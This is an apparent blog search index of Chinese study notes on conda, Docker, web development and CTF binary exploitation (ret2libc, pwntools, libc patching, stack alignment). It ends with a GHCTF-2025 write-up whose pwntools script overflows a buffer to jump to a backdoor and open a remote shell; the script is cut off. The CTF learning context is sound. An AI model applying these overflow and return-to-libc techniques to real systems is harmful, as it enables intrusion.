<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>conda不完全指北</title>
    <link href="/2025/03/16/conda%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8C%97/"/>
    <url>/2025/03/16/conda%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<p>安装anaconda后，<br>将anaconda适配到powershell</p><p>每次启动powershell都会默认激活虚拟环境base<br>查看pip版本<br><img src="/2024/10/29/hello-world/ile-20250316220129252.png"><br>发现是anaconda中的pip<br>查看python版本和安装位置<br><img src="/2024/10/29/hello-world/ile-20250316220433217.png"><br>发现也是anaconda中的</p><p>如何取消默认激活？</p><hr><p>查看本机conda默认配置</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda config --show<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/ile-20250316215812261.png"><br>我们可以看到<br><code>auto_activate_base</code>属性默认设置为 <code>True</code><br>将其设置为<code>False</code>即可</p><p>使用命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda config --<span class="hljs-built_in">set</span> auto_activate_base False<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/ile-20250316220749782.png"><br>执行后查看<br><code>auto_activate_base</code>已经变成了<code>False</code></p><hr><p>关闭终端后再启动<br><img src="/2024/10/29/hello-world/ile-20250316221052211.png"><br>发现路径前已经没有了base前缀，<br>pip 和 python 切换成系统的pip和python了</p>]]></content>
    
    
    <categories>
      
      <category>Environment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>docker不完全指北</title>
    <link href="/2025/03/16/docker%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8C%97/"/>
    <url>/2025/03/16/docker%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<h1 id="使用Docker搭建CTF-Pwn做题环境"><a href="#使用Docker搭建CTF-Pwn做题环境" class="headerlink" title="使用Docker搭建CTF Pwn做题环境"></a>使用Docker搭建CTF Pwn做题环境</h1><blockquote><p>为了保证利用脚本能够正常打通，<br> 我们通常需要在<strong>本地准备相同的运行环境</strong>，<br> 并且在远程利用之前先在本地进行测试</p></blockquote><p>如果为每个不同的运行环境都单独准备一个Ubuntu虚拟机，<br>则太<strong>不优雅</strong>了</p><hr><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><blockquote><p>操作系统层面上的虚拟化方案<br>能够非常便捷地搭建不同pwn题所对应的原始环境</p></blockquote><blockquote><p>[!note] 对比虚拟机<br>硬件层面的虚拟化方案</p></blockquote><h2 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h2>]]></content>
    
    
    <categories>
      
      <category>Environment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx</title>
    <link href="/2025/03/15/Nginx/"/>
    <url>/2025/03/15/Nginx/</url>
    
    <content type="html"><![CDATA[<blockquote><p>怀着复杂悲伤的心情写这篇文章<br>顶着十分困倦的状态</p></blockquote><p>Nginx是高性能的HTTP和反向代理web服务器，<br>处理高并发能力十分强大，<br>支持热部署，启动简单，可以做到不间断运行。</p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>静态网站搭建与部署</title>
    <link href="/2025/03/14/%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%83%A8%E7%BD%B2/"/>
    <url>/2025/03/14/%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>三更半夜了搁这儿学网站部署，不嘻嘻😡</p></blockquote><h2 id="1-注册域名"><a href="#1-注册域名" class="headerlink" title="1. 注册域名"></a>1. 注册域名</h2><p>搭建静态网站之前，首先得有个网站域名</p><blockquote><p>应该有了，此步略</p></blockquote><h2 id="2-创建Bucket"><a href="#2-创建Bucket" class="headerlink" title="2.创建Bucket"></a>2.创建Bucket</h2><h1 id="CI-CD"><a href="#CI-CD" class="headerlink" title="CI&#x2F;CD"></a>CI&#x2F;CD</h1><p>在项目中写一个<code>.github/workflows/ci.yml</code>文件</p><blockquote><p>参考：<br><a href="https://juejin.cn/post/7222654249133981752">GitHub Actions 进行前端自动化部署如何使用 GitHub Actions 实现前端项目的自动化部署到服务器 - 掘金</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前后端实时双向通信</title>
    <link href="/2025/03/10/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%AE%9E%E6%97%B6%E5%8F%8C%E5%90%91%E9%80%9A%E4%BF%A1/"/>
    <url>/2025/03/10/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%AE%9E%E6%97%B6%E5%8F%8C%E5%90%91%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<p>本来想在 <em>珞珈攻略6.0</em> 这个项目中实现一下子，<br>但想到可以用计算来代替，就算了（时间有限</p><p><a href="https://zhuanlan.zhihu.com/p/3428014292">使用vue3实现计时器和倒计时效果 - 知乎</a></p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前后端联调之后端</title>
    <link href="/2025/03/09/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%81%94%E8%B0%83%E4%B9%8B%E5%90%8E%E7%AB%AF/"/>
    <url>/2025/03/09/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%81%94%E8%B0%83%E4%B9%8B%E5%90%8E%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<p>技术栈：<br>python+django+MySQL</p><ol><li><p>先激活虚拟环境</p></li><li><p>清空数据库 但保留数据库结构：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python manage.py flush --no-input<br></code></pre></td></tr></table></figure></li><li><p>安装相关依赖</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">pip install -r requirement.txt<br></code></pre></td></tr></table></figure></li><li><p>重新运行迁移</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">python manage.py makemigrations<br>python manage.py migrate<br></code></pre></td></tr></table></figure></li><li><p>重新加载初始数据：(如果有)<br>有一个<code>initial_data.json</code>文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python manage.py loaddata initial_data.json<br></code></pre></td></tr></table></figure></li><li><p>启动服务器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python manage.py runserver<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前端如何mock数据</title>
    <link href="/2025/03/09/%E5%89%8D%E7%AB%AF%E5%A6%82%E4%BD%95mock%E6%95%B0%E6%8D%AE/"/>
    <url>/2025/03/09/%E5%89%8D%E7%AB%AF%E5%A6%82%E4%BD%95mock%E6%95%B0%E6%8D%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="创建本地JSON文件"><a href="#创建本地JSON文件" class="headerlink" title="创建本地JSON文件"></a>创建本地JSON文件</h1><ol><li><p>创建一个<code>data.json</code>文件<br>在里面写<code>json</code></p></li><li><p>通过<code>axios</code>或<code>fetch</code>请求本地JSON文件</p></li></ol><blockquote><p>参考：<br><a href="https://worktile.com/kb/p/3631378#:~:text=%E5%9C%A8Vue%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E4%B8%AD%EF%BC%8CMock%E6%95%B0%E6%8D%AE%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B8%B8%E8%A7%81%E4%B8%94%E9%87%8D%E8%A6%81%E7%9A%84%E5%AE%9E%E8%B7%B5%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%9C%A8%E5%BC%80%E5%8F%91%E5%92%8C%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E6%A8%A1%E6%8B%9F%E5%90%8E%E7%AB%AFAPI%E7%9A%84%E5%93%8D%E5%BA%94%E3%80%82%201%E3%80%81%E4%BD%BF%E7%94%A8Mocking%E5%BA%93%E5%A6%82Mock.js%EF%BC%8C2%E3%80%81%E4%BD%BF%E7%94%A8%E6%9C%AC%E5%9C%B0JSON%E6%96%87%E4%BB%B6%EF%BC%8C3%E3%80%81%E9%80%9A%E8%BF%87Vue,CLI%E6%8F%92%E4%BB%B6%EF%BC%8C4%E3%80%81%E4%BD%BF%E7%94%A8%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%A3%E7%90%86%E3%80%82%20%E4%BB%A5%E4%B8%8B%E6%98%AF%E8%AF%A6%E7%BB%86%E7%9A%84%E6%96%B9%E6%B3%95%E5%92%8C%E6%AD%A5%E9%AA%A4%EF%BC%9A%20Mock.js%E6%98%AF%E4%B8%80%E4%B8%AA%E6%B5%81%E8%A1%8C%E7%9A%84Mock%E5%BA%93%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%8D%AE%E5%B9%B6%E6%8B%A6%E6%88%AAAjax%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%BB%A5%E4%BE%BF%E5%9C%A8%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5%E6%A8%A1%E6%8B%9FAPI%E5%93%8D%E5%BA%94%E3%80%82">前端如何mock数据vue • Worktile社区</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前端实现扫描二维码</title>
    <link href="/2025/03/09/%E5%89%8D%E7%AB%AF%E5%AE%9E%E7%8E%B0%E6%89%AB%E6%8F%8F%E4%BA%8C%E7%BB%B4%E7%A0%81/"/>
    <url>/2025/03/09/%E5%89%8D%E7%AB%AF%E5%AE%9E%E7%8E%B0%E6%89%AB%E6%8F%8F%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h1><p>设计一下路径</p><pre><code class=" mermaid">graph TDA[A1] --&gt; C[B1]B[A2] --&gt; CC --&gt; D[C1]</code></pre><p>在线二维码生成器：<br><a href="https://www.hlcode.cn/?p=bd-kccs-sc-240912-1&bd_vid=4202142843968583576">互联二维码生成器_二维码在线制作_应用方案提供商</a></p><p>目标地点”A1” 作为文本<br>生成二维码：<br><img src="/2024/10/29/hello-world/hsX-EOQ6.png"></p><p>然后利用本地存储存下已经走过的路径即可</p><hr><p>可以将路径标记设计得更简洁一点：</p><pre><code class=" mermaid">graph TDA1[0] --&gt; B1[1]A2[0] --&gt; B1[1]B1 --&gt; C1[2]</code></pre><hr><h1 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h1><p>前端实现扫描和解析</p><blockquote><p>参考<br><a href="https://docs.pingcode.com/baike/2460094">扫描二维码前端如何实现 | PingCode智库</a><br><a href="https://www.cnblogs.com/wasbg/p/18468062">vue3+vite+ts+vue3-qr-reader实现移动端h5+pc端调起摄像头核销二维码 - 廖客 - 博客园</a></p></blockquote><p>发现一个不错的UI库：<br><a href="https://www.naiveui.com/zh-CN/os-theme/docs/installation">安装 - Naive UI</a></p><p>移动端UI组件库：vant</p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>流水线CPU</title>
    <link href="/2025/03/07/%E6%B5%81%E6%B0%B4%E7%BA%BFCPU/"/>
    <url>/2025/03/07/%E6%B5%81%E6%B0%B4%E7%BA%BFCPU/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>one_gadget</title>
    <link href="/2025/03/06/one_gadget/"/>
    <url>/2025/03/06/one_gadget/</url>
    
    <content type="html"><![CDATA[<p><a href="https://bbs.kanxue.com/thread-261112.htm">[原创]pwn中one_gadget的使用技巧-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://blog.csdn.net/m0_46687377/article/details/118223887">ubuntu中one_gadget的安装下载_onegadget下载-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2shellcode</title>
    <link href="/2025/03/05/ret2shellcode/"/>
    <url>/2025/03/05/ret2shellcode/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>更改pwn题libc</title>
    <link href="/2025/03/04/%E6%9B%B4%E6%94%B9pwn%E9%A2%98libc/"/>
    <url>/2025/03/04/%E6%9B%B4%E6%94%B9pwn%E9%A2%98libc/</url>
    
    <content type="html"><![CDATA[<blockquote><p>参考：<br>  <a href="https://blog.csdn.net/j284886202/article/details/142406824">★pwn 更改pwn题libc保姆级教程★_pwn libc-CSDN博客</a></p></blockquote><h1 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h1><p>我已经有了<br><img src="/2024/10/29/hello-world/ile-20250304161304899.png"><br>仓库链接：<br><a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p><h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><p>我也有了</p><h1 id="glibc-all-in-one下载与调整libc"><a href="#glibc-all-in-one下载与调整libc" class="headerlink" title="glibc-all-in-one下载与调整libc"></a>glibc-all-in-one下载与调整libc</h1><p>如果题目没有给libc<br>则需要泄漏并使用LibcSearcher</p><p>如果题目给了libc：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">strings libc.so.6 | grep ubuntu<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/ile-20250304171540001.png"><br>ubuntu版本为2.23-0ubuntu11.3<br>在glibc-all-in-one下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> list<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/ile-20250304172105081.png"><br>可以查看所有能够下载的libc版本<br><img src="/2024/10/29/hello-world/ile-20250304172234119.png"></p><p>现在我们可以下载<code>2.23-0ubuntu11.3_amd64</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./download 2.23-0ubuntu11.3_amd64<br></code></pre></td></tr></table></figure><p>执行后即可下载<br>保存在<code>~/glibc-all-in-one/libs</code>下<br><img src="/2024/10/29/hello-world/ile-20250304172528104.png"><br>进入该libc中<br><img src="/2024/10/29/hello-world/ile-20250304172733380.png"><br>可以发现有一个<code>.debug</code>目录，这个目录中保存了该libc的符号表信息<br>进入<code>.debug/lib/x86_64-linux-gnu</code>，可以找到<code>libc-2.23.so</code>文件<br><img src="/2024/10/29/hello-world/ile-20250304173311500.png"><br>将这个文件，放到<code>.debug/</code>目录下。<br>也可以把这些文件全部拖到<code>.debug/</code>下</p><p>这样，就可以在不动用gdb的命令的情况下，patchelf更改好文件libc后，<br>gdb打开后就能直接加载好符号表</p><p>但是，ubuntu版本在2.31和2.34后的符号信息表位置发生了些许变化<br>我们需要省流操作：<br>在<code>.debug/</code>目录下执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cp</span> .build-id/*/* ./<br></code></pre></td></tr></table></figure><p>将<code>./build-id/</code>目录以及其子目录下的<strong>文件</strong>，都复制到<code>.debug</code>文件下</p><hr><h1 id="使用patchelf"><a href="#使用patchelf" class="headerlink" title="使用patchelf"></a>使用patchelf</h1><blockquote><p>接下来， 是使用patchelf更改libc的操作</p></blockquote><p>先将<code>~/glibc-all-in-one/libs/</code>下的<code>2.23-0ubuntu11.3_amd64</code>移动到pwn题目文件的同级目录下，然后执行： 即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">patchelf &lt;fileName&gt; --set-interpreter ./2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath ./2.23-0ubuntu3_amd64<br></code></pre></td></tr></table></figure><p><code>-set-interpreter</code>：设置ld，要指定为目录下的ld文件<br><code>-set-rpath</code>：设置了运行环境，要指定为libc的目录</p><p>2.25以上：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">patchelf &lt;fileName&gt; --set-interpreter ./2.35-0ubuntu3.8_amd64/ld-linux-x86-64.so.2 --set-rpath ./2.35-0ubuntu3.8_amd64<br></code></pre></td></tr></table></figure><p>(ld换成了默认的了，没有具体的版本名了)</p><hr><p>LibcSearcher项目<br><a href="https://github.com/zarkivy/LibcSearcher">zarkivy&#x2F;LibcSearcher: 🔍 LibcSearcher-ng – get symbols’ offset in glibc.</a></p><hr><p>学了一些命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">lsof | grep /path/to/your_binary<br></code></pre></td></tr></table></figure><p>查看目标程序的进程</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">killall -9 your_binary<br></code></pre></td></tr></table></figure><p>强制终止所有相关进程</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机使用技巧</title>
    <link href="/2025/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <url>/2025/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<p>ctrl+shift+v ： 以纯文本方式zhantie</p>]]></content>
    
    
    <categories>
      
      <category>chore</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>调用约定</title>
    <link href="/2025/03/04/%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/"/>
    <url>/2025/03/04/%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p><img src="/2024/10/29/hello-world/250304134808299.png"><img src="/2024/10/29/hello-world/250304134821104.png"><br>指针型即地址 int &amp; pointer</p><p><img src="/2024/10/29/hello-world/250304135441114.png"><br><img src="/2024/10/29/hello-world/250304135454173.png"></p><hr><p><img src="/2024/10/29/hello-world/250304135110837.png"><br><img src="/2024/10/29/hello-world/250304135121657.png"><br><img src="/2024/10/29/hello-world/250304135131124.png"></p><hr><p><img src="/2024/10/29/hello-world/250304135404493.png"></p><hr><p><img src="/2024/10/29/hello-world/250304135016471.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>函数栈帧</title>
    <link href="/2025/03/04/%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7/"/>
    <url>/2025/03/04/%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7/</url>
    
    <content type="html"><![CDATA[<p>x86_64 &amp; x86<br>函数基本结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">push rbp<br>mov  rbp, rsp<br>...<br>mov  rsp, rbp<br>pop  rbp<br>ret<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/250304102527950.png"><br>进入新函数的栈帧前，要要将调用函数指令的下一条指令地址压入栈里（调用者的栈帧）。</p><p>64位<br>再调用新函数前<br><img src="/2024/10/29/hello-world/250304114237239.png"><br>rsp是00<br>调用新函数后<br><img src="/2024/10/29/hello-world/250304114328476.png"><br>先把下一条指令的地址：jmp main+175 压入栈<br>此时rsp是08<br>因此在新函数栈帧中第一个push前rsp需要是08</p><p>若涉及栈对齐问题<br>可考虑在返回地址处先塞一个 ret 指令的地址<br>或者跳过第一个push</p><p>ret &#x3D; pop ip(利用栈中的数据切换ip值)</p><p>像这种情况（ret2libc）<br><img src="/2024/10/29/hello-world/250304115347445.png"><br>跳转到plt后<br>执行完plt中的句子<br>跳转到puts函数地址</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwntools使用</title>
    <link href="/2025/03/04/pwntools%E4%BD%BF%E7%94%A8/"/>
    <url>/2025/03/04/pwntools%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">elf = ELF(<span class="hljs-string">&quot;./attachment&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="ELF对象的属性"><a href="#ELF对象的属性" class="headerlink" title="ELF对象的属性"></a>ELF对象的属性</h1><p><code>elf.symbols</code><br><strong>字典</strong>，存储符号表（包括函数、全局变量）</p><p><code>elf.symbols[&quot;main&quot;]</code><br><code>main</code>函数的地址</p><p><code>elf.got</code><br><strong>字典</strong>，存储GOT表中各函数的表项地址</p><p><code>elf.got[&quot;puts&quot;]</code><br><code>puts</code>在GOT表中的地址</p><p><code>elf.plt</code><br><strong>字典</strong>，存储PLT表中各函数的入口地址</p><p><code>elf.plt[&quot;puts&quot;]</code><br><code>puts</code>在PLT表中的入口地址</p><p><code>elf.symbols[&quot;puts&quot;]</code><br>简写<code>elf.sym</code><br>如果<code>puts</code>是静态链接，<br>会返回<code>puts</code>在<code>.text</code>段中的真实地址（<code>.puts</code>代码的起始地址）<br>如果<code>puts</code>是动态链接</p><ul><li>返回的是<code>puts@plt</code>,也就是<code>puts</code>在PLT中的地址</li><li>PLT只是一个跳转stub，并不是真正的<code>puts</code>实现</li><li>如果想要<code>puts</code>在<code>libc</code>中的真实地址，需要用<code>elf.got[&quot;puts&quot;]</code>，并在程序运行时解析它。</li></ul><p><strong>查找字符串</strong><br><code>elf.search[b&quot;/bin/sh&quot;]</code><br>在ELF文件中搜索字符串<code>/bin/sh</code>的地址<br><code>elf.search[b&quot;flag&quot;]</code><br>在ELF文件中搜索“flag”相关的字符串</p><h1 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h1><p>可能的误区是，pwntools在静态分析时给出的地址是相对于文件中的偏移，而不是实际运行时的绝对地址。</p><h1 id="python脚本常用语法"><a href="#python脚本常用语法" class="headerlink" title="python脚本常用语法"></a>python脚本常用语法</h1>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2libc</title>
    <link href="/2025/03/03/ret2libc-1/"/>
    <url>/2025/03/03/ret2libc-1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>libc基地址 + 函数偏移量 &#x3D; 函数真实地址</p></blockquote><p>问题是&#x3D;&#x3D;怎么找libc基地址&#x3D;&#x3D;呢？<br>&#x3D;&gt; 泄漏一个函数的真实地址</p><blockquote><p>有时间了解一下 <em>libc的延迟绑定技术</em> <em>got表-plt表</em></p></blockquote><p>泄漏一个函数的真实地址<br>&#x3D;&gt; 一般方法是采用&#x3D;&#x3D;got表泄漏&#x3D;&#x3D;<br>以puts函数为例<br>只要之前执行过puts函数，got表里存放着的就是puts函数的真实地址了，<br>我们&#x3D;&#x3D;得到puts函数的got地址&#x3D;&#x3D;后，可以把这个地址作为参数传递给puts函数，则会把这个<strong>地址里的数据</strong>，即puts函数的真实地址给输出出来<br>&#x3D;&gt; 得到了函数的真实地址</p><blockquote><p>system地址 &#x3D; 基地址 + system偏移量<br>“&#x2F;bin&#x2F;sh”地址 &#x3D; 基地址 + “&#x2F;bin&#x2F;sh”偏移量</p></blockquote><hr><h2 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h2><p>存放动态链接库函数地址的内存区域</p><hr><h2 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h2><p>负责跳转到GOT表</p><hr><p><code>libc.so.6</code>是共享库（shared library）<br>它不会在内存中固定加载，而是动态加载到某个随机地址（受ASLR影响）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]))<br></code></pre></td></tr></table></figure><p>这个值是<code>puts</code>在<code>libc.so.6</code>文件中的固定偏移</p><hr>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈对齐</title>
    <link href="/2025/03/03/%E6%A0%88%E5%AF%B9%E9%BD%90/"/>
    <url>/2025/03/03/%E6%A0%88%E5%AF%B9%E9%BD%90/</url>
    
    <content type="html"><![CDATA[<h1 id="加ret"><a href="#加ret" class="headerlink" title="加ret"></a>加ret</h1><h1 id="跳push"><a href="#跳push" class="headerlink" title="跳push"></a>跳push</h1><p>需要花时间总结下<br>加pop行不行？<br><a href="https://blog.csdn.net/ATFWUS/article/details/104565483#:~:text=%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%EF%BC%9A%E9%93%BE%E6%8E%A5%EF%BC%9Ahttps://pan.baidu.com/s/1Lncq6vrUNEJ7vLKvTQ_gsA">ROP-基础-ret2libc2_ret2libc2下载-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GHCTF-2025_wp</title>
    <link href="/2025/03/03/GHCTF-2025-wp/"/>
    <url>/2025/03/03/GHCTF-2025-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello_world"></a>Hello_world</h1><p>给了后门函数，基本的栈溢出<br><img src="/2024/10/29/hello-world/p/file-20250303200604157.png"><br>有pie</p><p>partial write + 栈对齐<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    offset = <span class="hljs-number">0x20</span> + <span class="hljs-number">8</span><br>    addr_backdoor = <span class="hljs-number">0x09C2</span><br>    payload = <span class="hljs-string">b&quot;A&quot;</span> * offset + p16(addr_backdoor)<br>    <span class="hljs-comment"># p = process(&quot;./attachment&quot;)</span><br>    <span class="hljs-comment"># p = gdb.debug(&quot;./attachment&quot;, &quot;b *main&quot;)</span><br>    <span class="hljs-comment"># node2.anna.nssctf.cn:28200</span><br>    p = remote(<span class="hljs-string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="hljs-number">28200</span>)<br>    <span class="hljs-comment"># pause()</span><br>    p.sendafter(<span class="hljs-string">&quot;Hello pwner!\n&quot;</span>,payload)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == 